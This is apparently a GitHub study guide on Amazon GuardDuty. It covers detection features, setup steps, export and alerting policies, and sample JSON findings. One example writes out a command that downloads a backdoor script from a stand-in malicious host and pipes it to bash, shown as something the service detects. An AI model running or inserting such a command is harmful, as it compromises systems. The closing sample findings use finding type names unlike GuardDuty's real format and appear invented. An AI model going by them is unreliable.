# **Amazon GuardDuty – Threat Detection for AWS**
## Overview
Amazon GuardDuty is a **managed threat detection service** that helps protect your AWS accounts, workloads, and data. 
- **_Technologies Behind GuardDuty_**
  - **Machine Learning (ML)** to identify anomalies.
  - **Threat Intelligence Feeds** from AWS and partners (e.g., malicious IPs/domains, malware hashes).
  - **Contextual Analysis** for understanding threats in real time.

- **Amazon GuardDuty** is a managed threat detection service that continuously monitors for malicious activity and unauthorized behavior. It uses multiple foundational data sources:
  - AWS CloudTrail management events
  - Amazon VPC Flow Logs
  - Amazon Route 53 DNS query logs

- GuardDuty can also monitor additional optional data sources (called protection types) such as:
  - Amazon S3 data events
  - EKS audit logs
  - RDS login activity
  - Lambda network logs
  - Runtime Monitoring (for EC2, ECS, EKS)
  - EBS volumes (Malware scan)

- **Easy to Use**
  - **One-click activation** — No need for complex setup or agents.
  - **Out-of-the-box functionality** — Immediate insights without extra configurations.

- **How It Works**
  - GuardDuty continuously analyzes **tens of billions of events per minute** from AWS data sources to:
    - Detect **suspicious behavior** or unauthorized activities.
    - Identify and **prioritize threats** based on context and risk.
    - Provide **security context** for faster incident response.

- **Integrated and Scalable**
  - Works across **EC2**, **ECS**, **EKS**, **AWS Lambda**, **RDS**, **Aurora**, and **S3**.
  - Seamless integration with **AWS services** like AWS Security Hub, Amazon EventBridge, and AWS Lambda for **automated remediation**.
  - Scales effortlessly across all your AWS resources.

- Benefits
  - **Continuous monitoring** across AWS accounts and regions.
  - **No agent required** – Fully managed.
  - **Fast threat response** with automated alerts and integrations.
  - **Improves security posture** with proactive threat detection.

---

## **Features**
Amazon GuardDuty is a smart threat detection service designed to monitor and protect your AWS environment. It uses machine learning, threat intelligence, and behavior analysis to identify security threats in real time.

### What GuardDuty Can Detect

| 🧨 Threat Type                          | 🔍 Description                                                                      |
| --------------------------------------- | ----------------------------------------------------------------------------------- |
| **Compromised Credentials**             | Detects if AWS access keys are stolen and misused.                                  |
| **Data Exfiltration**                   | Flags data theft or destruction—potential signs of ransomware.                      |
| **Unusual DB Access**                   | Anomalous login patterns in Aurora & RDS databases.                                 |
| **Unauthorized Cryptomining**           | Identifies mining operations on EC2 & container instances.                          |
| **Malware Presence**                    | Detects known malware in EC2, containers, and S3 file uploads.                      |
| **Suspicious OS/Network/File Behavior** | Identifies OS-level intrusions on EKS, ECS (Fargate), EC2, and container workloads. |

<details>
 <summary>Click to view Features with Example</summary>

### 1. **Continuous Monitoring of Foundational Data Sources**
GuardDuty automatically monitors three main AWS data sources:

1. **AWS CloudTrail management events** – Tracks user activities like API calls.
2. **VPC Flow Logs** – Logs traffic going in and out of your EC2 instances.
3. **DNS Logs** – Tracks domain name lookups made by your resources.

<details>
 <summary>Click to view Example</summary>

### Example:

Suppose an EC2 instance starts making DNS queries to a known malware domain (e.g., `bad-malware-site.ru`). GuardDuty detects this through DNS logs and alerts you with a finding like:

> *"EC2 instance is communicating with a known command-and-control domain."*

📘 No manual setup is required—just enable GuardDuty and it starts monitoring.

</details>

---

### 2. **Extended Threat Detection (Multi-Stage Attacks)**
Detects **attack chains** that span multiple logs, AWS services, or over time. It correlates events that might seem harmless individually but are dangerous when combined.

<details>
 <summary>Click to view Example</summary>

### Example:

1. An attacker logs into your account using a compromised credential (CloudTrail log).
2. Then launches a new EC2 instance (CloudTrail).
3. That EC2 instance starts scanning internal IPs (VPC Flow Logs).

GuardDuty pieces these events together and creates a single **attack sequence finding**, like:

> *"Suspicious EC2 activity: Unauthorized access followed by lateral network scanning."*

📘 Extended Threat Detection is **enabled by default** and has **no extra cost**.

</details>

---

### 3. **Use-Case Focused Protection Plans**
GuardDuty offers optional "add-on" features for **specific AWS services** to enhance security.

### **S3 Protection**
Analyzes access patterns and newly uploaded files in your Amazon S3 buckets.

<details>
 <summary>Click to view Example</summary>

#### Example:

If someone downloads hundreds of files in a short time from an S3 bucket, GuardDuty might flag:

> *"Unusual data download from S3 bucket, possible exfiltration."*

📘 Enable S3 protection to monitor **data access and potential leaks**.

</details>

---

### **EKS Protection**
Monitors Kubernetes API (audit logs) in Amazon EKS for suspicious behavior.

<details>
 <summary>Click to view Example</summary>

#### Example:

A user tries to escalate privileges using `kubectl create clusterrolebinding`:

> *"Kubernetes privilege escalation attempt in EKS cluster."*

📘 Helps detect attacks like misconfigured roles or unauthorized deployments.

</details>

---

### **Runtime Monitoring**
Watches system-level activity (like file or process operations) in EC2, ECS (Fargate), and EKS.

<details>
 <summary>Click to view Example</summary>

#### Example:

GuardDuty sees a suspicious shell command like:

```bash
curl http://malicious.com/backdoor.sh | bash
```

> *"Suspicious command execution detected in EC2."*

📘 Useful for detecting malware, reverse shells, or script-based attacks.

</details>

---

### **Malware Protection for EC2 (EBS Scanning)**

Scans EBS volumes for known malware signatures.

<details>
 <summary>Click to view Example</summary>

#### Example:

After a breach, you run a malware scan on EC2 and GuardDuty detects:

> *"Malware signature matched in EBS volume attached to EC2 instance."*

📘 Available as **on-demand or scheduled** scans.

</details>

---

### 🧪 **Malware Protection for S3**

Scans newly uploaded S3 objects for malware.

<details>
 <summary>Click to view Example</summary>

#### Example:

Someone uploads an infected ZIP file to an S3 bucket:

> *"Malware detected in newly uploaded file to S3."*

📘 You can use this feature **independently** without enabling full GuardDuty.

</details>

---

### **RDS Protection**

Analyzes **login attempts** to Aurora and RDS databases for unusual behavior.

<details>
 <summary>Click to view Example</summary>

#### Example:

Multiple failed login attempts from an IP in another country:

> *"Brute-force login attempt on RDS instance."*

📘 Protects your database from unauthorized access.

</details>

---

### **Lambda Protection**

Monitors **network activity** of Lambda functions, especially when running in VPC.

<details>
 <summary>Click to view Example</summary>

#### Example:

A Lambda function connects to a known crypto mining domain:

> *"AWS Lambda making outbound calls to known mining pool IP."*

📘 Helps detect misuse of serverless compute for malicious purposes.

</details>

---

### 4. **Multi-Account Management**
Centralized monitoring of multiple AWS accounts using:

* **AWS Organizations** (recommended)
* **Legacy invitation-based method**

<details>
 <summary>Click to view Example</summary>

### Example:

You are a security admin for 10 AWS accounts. Set up GuardDuty in your org master account to monitor all others from one place.

📘 Centralized view = simplified management and cost tracking.

</details>

---

### 5. **Security Findings and Sample Tests**
GuardDuty generates **detailed findings** when it detects a threat. Each finding includes:

* Threat type and severity
* Affected resources
* Recommended action

<details>
 <summary>Click to view Example</summary>

### Example:

> *"Recon\:EC2/PortProbeUnprotectedPort – An external IP is probing your EC2 port 22 (SSH).”*

You can also:

* Use **sample findings** for testing.
* Use **tester scripts** to simulate scenarios.

📘 Helps teams learn how to respond to real-world alerts.

</details>

---

### 6. **Managing and Visualizing Findings**

* View results in the **GuardDuty console dashboard**
* Query findings using:

  * **AWS CLI**
  * **AWS SDK**
  * **AWS Security Hub**

<details>
 <summary>Click to view Example</summary>

### Example:

Security team pulls high-severity findings across accounts:

```bash
aws guardduty list-findings --severity-criteria "HIGH"
```

📘 Enables analysis, alerting, and custom dashboards (e.g., using CloudWatch or Grafana).

</details>

---

### 7. **Integration with AWS Security Services**

### Integrated Services:

| Service                | Benefit                                                |
| ---------------------- | ------------------------------------------------------ |
| **AWS Security Hub**   | Central view of findings across AWS security services  |
| **Amazon Detective**   | Root cause analysis with visual timeline and graphs    |
| **Amazon EventBridge** | Automated response via Lambda, SNS, or Systems Manager |

<details>
 <summary>Click to view Example</summary>

### Example:

* When GuardDuty finds malware on EC2:

  * Security Hub prioritizes it.
  * Detective shows related actions (login, IP address).
  * EventBridge triggers Lambda to isolate the instance.

📘 Example Rule:

```json
{
  "source": ["aws.guardduty"],
  "detail-type": ["GuardDuty Finding"]
}
```

</details>

---

### 8. **PCI DSS Compliance**

* GuardDuty is **Level 1 PCI DSS certified**.
* Safe to use in environments where **credit card data** is processed or stored.

📘 You can request the AWS PCI Compliance package from the AWS Artifact console.

---

### 9. **Testing and Validation**

* Generate **sample findings** in the console.
* Use **testing scripts** to simulate threats and test responses.

<details>
 <summary>Click to view Example</summary>

### Example:

Generate test finding:

```bash
aws guardduty create-sample-findings --detector-id <your-detector-id>
```

</details>

</details>

---

## Pricing & Trial

* **Pay-as-you-go** – No upfront costs or commitments.
* **30-day free trial** – Try GuardDuty risk-free.

---

## Amazon GuardDuty Hands-On Documentation
### Key Notes:

* GuardDuty is a **Regional service** — it must be enabled in every AWS Region you wish to monitor.
* It is recommended to enable GuardDuty in **all supported Regions**, including those you don’t actively use, for broader detection.
* A 30-day free trial is available for newly enabled protection features in each Region.
* GuardDuty automatically creates service-linked IAM roles such as:

  * `AWSServiceRoleForAmazonGuardDuty`
  * `AWSServiceRoleForAmazonGuardDutyMalwareProtection`

<details>
  <summary>Click to view step by step hands on as per the documentation</summary>

---

## Step 1: Enable Amazon GuardDuty

### Standalone Account

1. Open GuardDuty console: [https://console.aws.amazon.com/guardduty](https://console.aws.amazon.com/guardduty)
2. Choose **Amazon GuardDuty - All features**.
3. Click **Get Started** > **Enable GuardDuty**.

### Multi-Account via AWS Organizations

* Designate an administrator account.
* Add and enable member accounts.

---

## Step 2: Generate Sample Findings

1. In the GuardDuty console, go to **Settings**.
2. Under **Sample findings**, choose **Generate sample findings**.
3. View results in:

   * **Summary** dashboard
   * **Findings** page (Sample findings will be prefixed with `[SAMPLE]`).
4. Click any finding to:

   * View JSON structure
   * Examine affected resources
   * Apply filters

To archive:

* Select all findings > **Actions** > **Archive**.
* Switch between **Current** and **Archived** view as needed.

---

## Step 3: Export Findings to Amazon S3

Exporting allows you to retain findings beyond the default 90-day retention using encrypted storage in Amazon S3.

### Step-by-Step:

#### 1. Create or Choose a KMS Key

* Go to AWS KMS Console: [https://console.aws.amazon.com/kms](https://console.aws.amazon.com/kms)
* Select or create a symmetric key
* Copy the **Key ARN**
* Edit the key policy to allow GuardDuty access:

```json
{
  "Sid": "AllowGuardDutyKey",
  "Effect": "Allow",
  "Principal": {
    "Service": "guardduty.amazonaws.com"
  },
  "Action": "kms:GenerateDataKey",
  "Resource": "KMS key ARN",
  "Condition": {
    "StringEquals": {
      "aws:SourceAccount": "123456789012",
      "aws:SourceArn": "arn:aws:guardduty:Region:123456789012:detector/SourceDetectorID"
    }
  }
}
```

#### 2. Create or Edit S3 Bucket Policy

* Go to Amazon S3 > Your Bucket > **Permissions** > **Bucket Policy**
* Add policy to allow GuardDuty access (replace placeholders):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Allow PutObject",
      "Effect": "Allow",
      "Principal": {
        "Service": "guardduty.amazonaws.com"
      },
      "Action": "s3:PutObject",
      "Resource": "bucket-arn/path/*",
      "Condition": {
        "StringEquals": {
          "aws:SourceAccount": "123456789012",
          "aws:SourceArn": "arn:aws:guardduty:region:123456789012:detector/detectorID"
        }
      }
    }
  ]
}
```

#### 3. Configure in GuardDuty

* Console > GuardDuty > Settings
* Choose **Configure S3 Export**
* Enter:

  * S3 Bucket ARN
  * KMS Key ARN
* Click **Save**

---

## Step 4: Configure SNS Alert for GuardDuty Findings

### Create SNS Topic

1. Open [Amazon SNS Console](https://console.aws.amazon.com/sns)
2. Go to **Topics** > **Create Topic** > Type: **Standard**
3. Name: `GuardDuty`
4. Click **Create Topic**
5. Create Subscription:

   * Protocol: **Email**
   * Enter your email
   * Confirm via email

### Create EventBridge Rule

1. Open [Amazon EventBridge Console](https://console.aws.amazon.com/events)
2. Go to **Rules** > **Create Rule**
3. Name your rule
4. Source: **AWS Services** > Service: **GuardDuty**
5. Event Type: **GuardDuty Finding**
6. Target: **SNS topic** > Select `GuardDuty`

#### Format Message with Input Transformer

**Input Path:**

```json
{
  "severity": "$.detail.severity",
  "Finding_ID": "$.detail.id",
  "Finding_Type": "$.detail.type",
  "region": "$.region",
  "Finding_description": "$.detail.description"
}
```

**Template:**

```text
You have a severity severity GuardDuty finding type Finding_Type in the Region region.

Description:
Finding_description

See more: https://console.aws.amazon.com/guardduty/home?region=region#/findings?search=id%3DFinding_ID
```

---

## Next Steps

### Customize GuardDuty Behavior

* **Finding Filters:** Create custom filters to group similar findings (e.g., by instance ID or account ID).
* **Suppression Rules:** Automatically archive expected behavior findings.
* **Trusted IP Lists & Threat Lists:** Allowlist or explicitly monitor known IPs.

### Stay Updated

* Use **Security Hub** for centralized monitoring.
* Use **Amazon Detective** for deeper investigations.
* Use **AWS Config** to track compliance changes.

</details>

Great! Here's a **clear comparison table** of all GuardDuty protection plans followed by **sample finding outputs** for each (S3, EKS, RDS, Lambda).

---

## ✅ GuardDuty Protection Plan Comparison Table

| Protection Plan              | Data Source / Signal                        | Auto-Enabled with GuardDuty?   | Detects                   | Example Threats                                        |
| ---------------------------- | ------------------------------------------- | ------------------------------ | ------------------------- | ------------------------------------------------------ |
| **S3 Protection**            | Amazon S3 Data Events (via CloudTrail)      | ❌ Optional                     | Data-level anomalies      | Data exfiltration, ransomware deletion, access via Tor |
| **EKS Protection**           | Kubernetes Audit Logs                       | ❌ Optional                     | API-level anomalies       | Privilege escalation, unusual API calls                |
| **RDS Protection**           | Login activity to RDS/Aurora DBs            | ❌ Optional                     | Access anomalies          | Brute-force login attempts, unusual DB client IPs      |
| **Lambda Protection**        | VPC Flow Logs (for Lambda functions in VPC) | ❌ Optional                     | Network threats           | Lambda reaching malware hosts, crypto mining           |
| **Runtime Monitoring**       | OS-level events from EC2, ECS, EKS          | ❌ Optional                     | Process and system events | Reverse shells, unauthorized tools                     |
| **Malware Protection (EC2)** | EBS Volume Snapshots (agentless scan)       | ✅ Auto-enabled in most Regions | Malware files             | Detected malware in EBS volumes                        |
| **Malware Protection (S3)**  | Newly uploaded S3 objects                   | ❌ Optional + Independent       | Malware files             | Malicious uploads to public/private buckets            |

---

## Sample GuardDuty Finding Outputs
![image](https://github.com/user-attachments/assets/f8be85a7-3995-4254-864f-2b586e94670d)

### 🪣 S3 Protection Finding

**Finding Type:** `S3.Bucket-Exfiltration.Unusual`
**Severity:** Medium

```json
{
  "resource": {
    "resourceType": "S3Bucket",
    "instanceDetails": {
      "bucketName": "my-finance-records"
    }
  },
  "service": {
    "action": {
      "actionType": "AWS_API_CALL",
      "apiCallDetails": {
        "api": "GetObject",
        "callerType": "Remote IP",
        "remoteIpDetails": {
          "ipAddressV4": "203.0.113.45",
          "country": "Russia"
        }
      }
    },
    "additionalInfo": {
      "anomaly": "Large volume of access from unfamiliar location"
    }
  }
}
```

---

### ☸️ EKS Protection Finding

**Finding Type:** `EKS.AccessKubernetesAPI.AnomalousBehavior`
**Severity:** High

```json
{
  "resource": {
    "resourceType": "KubernetesCluster",
    "instanceDetails": {
      "clusterName": "prod-eks-cluster"
    }
  },
  "service": {
    "action": {
      "apiCallDetails": {
        "api": "createSecret",
        "username": "system:anonymous"
      }
    },
    "additionalInfo": {
      "kubernetesUserAgent": "kubectl/v1.21.1",
      "anomaly": "Unauthorized user attempting to create secret"
    }
  }
}
```

---

### 🛢️ RDS Protection Finding

**Finding Type:** `RDS.LoginAnomaly.Behavioral`
**Severity:** Medium

```json
{
  "resource": {
    "resourceType": "RDSInstance",
    "instanceDetails": {
      "dbInstanceIdentifier": "customer-db-prod"
    }
  },
  "service": {
    "action": {
      "loginDetails": {
        "username": "admin",
        "sourceIp": "45.10.10.12",
        "location": "Unknown"
      }
    },
    "additionalInfo": {
      "anomaly": "Login from a previously unseen location and client"
    }
  }
}
```

---

### ⚡ Lambda Protection Finding

**Finding Type:** `Lambda.FunctionCommunication.MaliciousDomain`
**Severity:** High

```json
{
  "resource": {
    "resourceType": "LambdaFunction",
    "instanceDetails": {
      "functionName": "transaction-handler"
    }
  },
  "service": {
    "action": {
      "networkConnectionAction": {
        "remoteDomain": "cryptominer-malware.com",
        "protocol": "HTTPS"
      }
    },
    "additionalInfo": {
      "threatIntelIndicators": [
        {
          "type": "MaliciousDomain",
          "value": "cryptominer-malware.com"
        }
      ]
    }
  }
}
```

---

## 📌 Summary

* Once you enable protection plans for **S3, EKS, RDS, and Lambda**, GuardDuty will automatically begin **monitoring all relevant resources** using backend telemetry.
* The findings generated are **context-aware, JSON-formatted**, and **include resource identifiers**, event types, severities, and helpful remediation links.
* You can use EventBridge, Security Hub, or even Lambda to **automate responses** to these findings.

With Amazon GuardDuty:

* You get intelligent threat detection across AWS resources.
* You can automate response workflows.
* You can retain findings securely and gain historical insights.
* You can continuously adapt with filters, suppression rules, and IP lists.


